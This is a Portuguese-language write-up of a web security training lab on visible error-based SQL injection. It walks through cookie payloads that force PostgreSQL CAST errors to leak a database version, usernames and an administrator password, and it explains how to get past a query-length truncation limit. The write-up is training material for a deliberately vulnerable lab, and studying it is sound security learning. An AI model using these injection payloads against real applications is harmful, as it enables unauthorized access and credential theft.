# Lab: Visible error-based SQL injection

## Enunciado (traduzido)

Este lab contém uma vulnerabilidade de SQL injection. A aplicação utiliza um cookie de rastreamento (`TrackingId`) para análise de métricas e executa uma consulta SQL contendo o valor do cookie enviado.

Os resultados da consulta SQL não são retornados na página, porém a aplicação exibe mensagens de erro detalhadas (verbosas) do banco de dados em sua resposta.

O banco de dados contém uma tabela chamada `users`, com colunas chamadas `username` e `password`.

Para resolver o lab, utilize uma injeção SQL baseada em erros visíveis (visible error-based) para extrair a senha do usuário `administrator` e faça login com essa conta.

## O que fiz (Fluxo 1: Minha Investigação)

Iniciamos os testes interceptando o tráfego no Burp Suite e analisando a requisição que envia o cookie `TrackingId`. Para verificar como o backend lida com entradas maliciosas, adicionamos uma aspa simples `'` ao final do valor do cookie:

```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ'
```

A aplicação respondeu com uma mensagem de erro detalhada do PostgreSQL revelando a consulta interna completa e indicando que havia uma string literal não fechada (`unclosed string literal`). Isso nos mostrou que a entrada é concatenada diretamente entre aspas na query e que as mensagens de erro do banco são exibidas abertamente na tela.

Para verificar se podíamos controlar o fechamento da consulta, adicionamos caracteres de comentário (`--`) para anular o restante do código original:

```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ'--
```

A requisição retornou `HTTP 200 OK` sem mensagens de erro, confirmando que a sintaxe foi corrigida com sucesso.

### Validando a extração via erro com `CAST` e versão do banco

Para cravar que o banco é vulnerável à exfiltração de dados via erro, testamos injetar uma tentativa de conversão da função `version()` para o tipo inteiro (`int`) usando concatenação:

```http
Cookie: TrackingId='||(select cast(version() as int))||'
```

Como o resultado de `version()` é uma string descritiva e não um número, o PostgreSQL quebrou a execução e imprimiu a versão exata do banco dentro do próprio erro:

```text
ERROR: invalid input syntax for type integer: "PostgreSQL 12.22..."
```

### Tentativa de Extração com Concatenação Direta (`||`)

Aproveitando a lógica de concatenação que funcionou com a versão do banco, tentei buscar diretamente a senha da tabela de usuários:

```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ'||(SELECT CAST(password AS int) FROM users WHERE username = 'administrator')||'
```

A aplicação quebrou retornando o erro:
`Unterminated string literal started at position 67...`

**Onde travei (Pegadinha do Lab - O Truncamento):**  
Ao inspecionar minuciosamente a mensagem de erro e fazer um teste de stress preenchendo o campo do cookie com um comentário de bloco cheio de asteriscos (`/* ***** */`), o banco retornou `Unterminated block comment`. 

Isso expôs a anatomia do backend: a query resultante exibida no log tinha exatamente **95 caracteres**. Ou seja, o backend impõe um **limite de tamanho rígido** e passa a "tesoura" (truncamento físico) na string antes de enviá-la ao banco de dados. Como meu payload original era muito longo, o corte destruiu o fechamento das aspas e quebrou a sintaxe.

Para tentar liberar espaço útil dentro do limite do buffer de 95 caracteres, deletei o ID original do cookie (`ogAZZfxtOKUELbuJ`) e reduzi os caracteres, porém tentei enviar uma estrutura com o `SELECT` solto:

```http
Cookie: TrackingId='' select cast('' as int)'
```

**Por que falhou?**  
O banco retornou erro de sintaxe. No SQL, não é permitido colocar uma instrução `SELECT` solta grudada logo após uma string, sem um operador lógico interligando-as (como `AND`/`OR`) ou um operador de concatenação (`||`). Além disso, as aspas duplicadas criadas no final geraram um conflito gramatical no interpretador.

### O Acerto Contextual (A Resolução pelo Meu Método)

Ajustando a sintaxe para manter a concatenação limpa e o payload o mais curto possível para caber no buffer, removi filtros e enviei exatamente este comando:

```http
Cookie: TrackingId='||(SELECT CAST(password AS int) FROM users)||'
```

O PostgreSQL processou o comando completamente sem sofrer truncamento, falhou na conversão do tipo do dado e expôs a senha com sucesso na tela:

```text
ERROR: invalid input syntax for type integer: "107127y3iqlwvdq557i7"
```

O laboratório foi resolvido e consegui logar. No entanto, uma análise pós-exploração realista revelou que esse payload **falharia em 99% dos cenários reais**.

---

## A Ressalva do Mundo Real: Por que o meu fluxo é frágil?

Minha query simplificada `SELECT CAST(password AS int) FROM users` funcionou **única e exclusivamente porque a tabela `users` deste laboratório continha apenas 1 registro**.

Em um ambiente de produção real, tabelas possuem múltiplos usuários cadastrados. Se houvesse mais de uma linha na tabela, o PostgreSQL executaria a subquery de dentro para fora. Antes mesmo de avaliar o erro do `CAST`, o banco veria que uma subquery que retorna uma lista (múltiplas linhas) está tentando ser espremida e concatenada dentro de uma linha única. 

O banco abortaria a execução imediatamente e retornaria o erro genérico:
> `ERROR: more than one row returned by a subquery used as an expression`

Esse erro genérico bloquearia o processamento, escondendo o dado e estragando a extração da credencial. Além disso, se tentássemos expandir meu payload com cláusulas como `WHERE username='administrator'` ou `LIMIT 1`, a query voltaria a estourar o limite de 95 caracteres do buffer, sofrendo o truncamento físico do backend novamente.

---

## Fluxo 2: A Solução Oficial e Definitiva (Como o Lab Resolve)

Para contornar tanto o problema de **múltiplas linhas** quanto o **limite estrito de tamanho do buffer**, a solução estrutural correta exige o uso de operadores lógicos booleanos combinados com paginação rígida, conforme a metodologia oficial do laboratório [0.15].

### 1. Ajustando a Tipagem Booleana com `AND`

Ao tentar usar o operador `AND` com uma subquery simples:

```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
```

A aplicação respondeu com:  
`ERROR: argument of AND must be type boolean, not type integer`

Isso ocorre porque o **PostgreSQL é fortemente tipado**. O operador `AND` exige uma condição booleana (`true` ou `false`). Como o `CAST(... AS int)` retorna um número inteiro, o banco recusa a operação. 

Para resolver essa exigência, transformamos a expressão em uma comparação lógica adicionando `1=`, o que cria uma operação booleana válida:

```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```

A requisição foi aceita com sucesso (`200 OK`).

### 2. Contornando o Truncamento e Múltiplas Linhas

Ao expandir a subquery para buscar na tabela `users`:

```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
```

O erro de aspas não finalizadas voltou a acontecer por conta do limite de caracteres do buffer. Seguindo o procedimento correto para liberar espaço, o ID do cookie original foi completamente removido [0.15]:

```http
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
```

Com isso, a query coube inteira no buffer, mas disparou o erro de subquery retornando mais de uma linha (`more than one row returned...`) [0.15]. 

Para resolver este problema de forma definitiva e garantir o retorno de apenas uma única linha escalar por vez, aplicamos a cláusula `LIMIT 1` [0.15]:

```http
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

O PostgreSQL tentou converter o texto do primeiro registro para inteiro, falhou e vazou o usuário no erro [0.15]:
```text
ERROR: invalid input syntax for type integer: "administrator"
```

### 3. Extraindo a Senha com a Sintaxe Correta

Sabendo que o primeiro registro isolado pelo `LIMIT 1` era de fato o `administrator`, alteramos o campo `username` para `password` [0.15]:

```http
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

O banco falhou ao tentar transformar a string alfanumérica da senha em um número inteiro e expôs a credencial de forma limpa na mensagem de erro [0.15]:

```text
ERROR: invalid input syntax for type integer: "107127y3iqlwvdq557i7"
```

Utilizamos a senha coletada para efetuar o login e concluir formalmente o desafio.

---

[⬅ Voltar](../../README.md)